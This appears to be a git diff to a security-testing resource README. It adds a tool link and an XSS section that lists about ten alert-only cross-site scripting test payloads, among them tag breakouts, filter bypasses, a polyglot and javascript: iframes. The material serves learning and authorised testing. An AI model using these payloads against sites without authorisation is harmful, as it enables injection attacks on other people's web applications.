@@ -6,7 +6,8 @@
 [Wappalyze](https://www.wappalyzer.com/) - Find out the technology stack of a website.  
 [SecLists](https://github.com/danielmiessler/SecLists) - A collection of lists used during security assessments.     
 [Sublist3r](https://github.com/aboul3la/Sublist3r) - Collects and gathers subdomains for a target domain.    
-[fuff](https://github.com/ffuf/ffuf) - Web fuzzer. 
+[fuff](https://github.com/ffuf/ffuf) - Web fuzzer.   
+[XSS Hunter](https://github.com/mandatoryprogrammer/xsshunter)
 
 ## Reading
 
@@ -41,4 +42,23 @@ A set of guidelines and best practices to help organizations build and improve t
 | intitle  | intitle:admin  | 
 
 **Example:** "-site:www.example.com site:*.example.com" would only contain results leading to the domain name example.com but exclude any links to www.example.com.
+
+### Cross-site Scripting (XSS)
+
+[OWASP XSS Overview](https://owasp.org/www-community/attacks/xss/)
+[TryHackMe XSS Room](https://tryhackme.com/room/xssgi)
+
+```
+<script>alert('XSS');</script>    
+"><script>alert('XSS');</script>    
+</textarea><script>alert('XSS');</script>    
+';alert('XSS');//    
+<sscriptcript>alert('XSS');</sscriptcript>    
+/images/cat.jpg" onload="alert('XSS');    
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e    
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e    
+<iframe src=\"javascript:alert(XSS)\">    
+<iframe src="javascript:alert(`XSS`)">    
+```
+
 
